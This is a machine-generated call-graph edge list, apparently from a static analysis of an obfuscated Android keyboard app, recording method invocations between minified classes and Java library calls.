STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r0, $r1) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: $r3 = staticinvoke <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>($r4, $r5, $r2) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>($r2, $i5, $i1, null) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Duplicated extension singleton: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsp: java.lang.String b()> ==> <java.lang.String: java.lang.String replace(char,char)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r1, $r5) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lrg: void <init>(java.lang.Object)>($r0) in <lma: lma r(java.lang.Object)> ==> <lrg: void <init>(java.lang.Object)>
CLINIT edge: staticinvoke <hnc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnc: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>($r2, $l1, $r0) in <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>
SPECIAL edge: specialinvoke $r9.<lta: void <init>(lsr,java.lang.Object)>($r3, $r7) in <lsn: boolean ac()> ==> <lta: void <init>(lsr,java.lang.Object)>
CLINIT edge: staticinvoke <lqq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqq: void <clinit>()>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean k(char)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(4) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/future/FluentFuture") in <her: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete extension subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i4 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <dwx: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<mij: void <init>(miy)>($r1) in <her: void <init>(miy)> ==> <mij: void <init>(miy)>
STATIC edge: $r3 = staticinvoke <lkq: lkq q()>() in <lmo: lqs G(java.util.Comparator)> ==> <lkq: lkq q()>
SPECIAL edge: specialinvoke r0.<java.io.InputStream: void <init>()>() in <bek: void <init>(java.nio.ByteBuffer)> ==> <java.io.InputStream: void <init>()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lin: void <init>(ldp,lqd)> ==> <lqd: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: void h()>
SPECIAL edge: specialinvoke $r0.<lpi: void <init>(java.lang.String,int)>("KEY", 0) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void g(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void g(java.lang.String)>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r3, $i3) in <lma: lma i(int,java.lang.Object[])> ==> <lri: void t(java.lang.Object,int)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<java.util.Map: java.lang.Object get(java.lang.Object)>($r4) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void l(int)>($i6) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void l(int)>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r7, $i5) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hns: void <init>()> ==> <iec: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(long)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <ljb: void <init>(ljd,int)> ==> <lid: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: $r11 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <ivv: ivw i(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(13) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r5 = virtualinvoke $r19.<java.lang.ThreadLocal: java.lang.Object get()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.ThreadLocal: java.lang.Object get()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r9 = virtualinvoke $r6.<lly: lma g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: lma g()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>($r2) in <gwk: void <init>()> ==> <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r0 = staticinvoke <lum: lvm i()>() in <lum: lvt k()> ==> <lum: lvm i()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t find the Unsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<llo: void <init>(lkx,int)>($r2, $i0) in <lme: void <init>(lkx,int)> ==> <llo: void <init>(lkx,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
SPECIAL edge: $r4 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r2) in <ivv: ivw a()> ==> <ivv: ivw i(java.lang.String)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r4, $i2, 2) in <nzh: boolean f(ivv)> ==> <iwt: void g(char[],int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null searchFeature") in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: boolean isAssignableFrom(java.lang.Class)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <ljd: ljd g()>() in <lli: void <init>()> ==> <ljd: ljd g()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(20) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lvt: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c2) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.String getName()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <lkh: java.lang.Object[] toArray()> ==> <lkh: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r7.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: void <init>(java.util.List)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(3) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke $r1.<ljf: void <init>()>() in <lmb: java.util.Collection b()> ==> <ljf: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r6.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <nzh: boolean f(ivv)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <lql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lql: void <clinit>()>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "metadata key") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.List: java.lang.Object get(int)>($i1) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: java.lang.Object get(int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r3) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>($r3, $r2) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lje: java.lang.Object next()>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: int o(int,int,int,int)> ==> <ljf: java.lang.Object p()>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljd: int z(int,int,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r1, $i0, $i1, $r2) in <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 97, 122, $i0) in <iwt: java.lang.String e(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r2) in <iye: void I(boolean,java.lang.Object)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <ltf: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: $i4 = specialinvoke r0.<ljf: int n()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int n()>
STATIC edge: $r7 = staticinvoke <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>($r6) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lso: void <init>()> ==> <lsq: void <init>()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <ljf: java.util.Iterator iterator()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(1) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>(1, "skipFrames must be >= 0") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqo: lsa l()> ==> <lkq: lsb B()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map m()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map m()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(14) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r8.<ivw: void <init>()>() in <ivw: void <clinit>()> ==> <ivw: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("BitmojiImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r1, $r2) in <lmb: void g(java.lang.Object,java.lang.Object)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r13.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[],int,int)>
STATIC edge: staticinvoke <lri: void u(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lri: void u(java.lang.Object[])>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r4.<hnp: void <init>()>() in <hnt: void <clinit>()> ==> <hnp: void <init>()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $l0 = virtualinvoke r0.<j$.sun.misc.b: long k(java.lang.reflect.Field)>($r4) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <j$.sun.misc.b: long k(java.lang.reflect.Field)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.os.ParcelFileDescriptor openFile(android.net.Uri,java.lang.String)>(null, "") in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.os.ParcelFileDescriptor openFile(android.net.Uri,java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Resetting default value is disallowed [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>($r2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c3) in <ivw: boolean t(char[],int,int)> ==> <ivw: boolean O(char)>
SPECIAL edge: specialinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void <init>(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>(long)>
SPECIAL edge: specialinvoke $r7.<java.lang.String: void <init>(char[])>($r3) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<llo: lsa F()>() in <lmc: lsa l()> ==> <llo: lsa F()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <ljd: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(46) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r1.<llg: void <init>(llo)>(r0) in <llo: lsa F()> ==> <llg: void <init>(llo)>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int c()>() in <ljf: java.util.Set f()> ==> <ljf: int c()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <oru: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r1.<lqn: void <init>(lkx,java.lang.Object[],int,int)>(r0, $r2, 0, $i0) in <lqq: lma f()> ==> <lqn: void <init>(lkx,java.lang.Object[],int,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqn: lsa l()> ==> <lma: lkq k()>
SPECIAL edge: specialinvoke $r2.<lqs: void <init>(lkq,java.util.Comparator)>($r3, $r0) in <lmo: lqs G(java.util.Comparator)> ==> <lqs: void <init>(lkq,java.util.Comparator)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(1) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <iej: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iej: void <clinit>()>
INTERFACE edge: $r2 = interfaceinvoke $r8.<java.util.Iterator: java.lang.Object next()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.d: java.lang.Object next()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r25.<mag: void <init>(java.lang.String,int,int)>("TENOR_TRENDING_SEARCH_TERM_METADATA", 25, 25) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(10) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
STATIC edge: $r3 = staticinvoke <lkq: lkq g(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lkq: lkq g(java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 65, 90, 32) in <iwt: java.lang.String c(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
STATIC edge: $i0 = staticinvoke <lri: int b(java.util.Set)>(r0) in <lma: int hashCode()> ==> <lri: int b(java.util.Set)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lrg: lsa l()>() in <lrg: java.util.Iterator iterator()> ==> <lrg: lsa l()>
CLINIT edge: staticinvoke <j$.sun.misc.b: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.sun.misc.b: void <clinit>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(20) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
CLINIT edge: staticinvoke <ltr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltr: void <clinit>()>
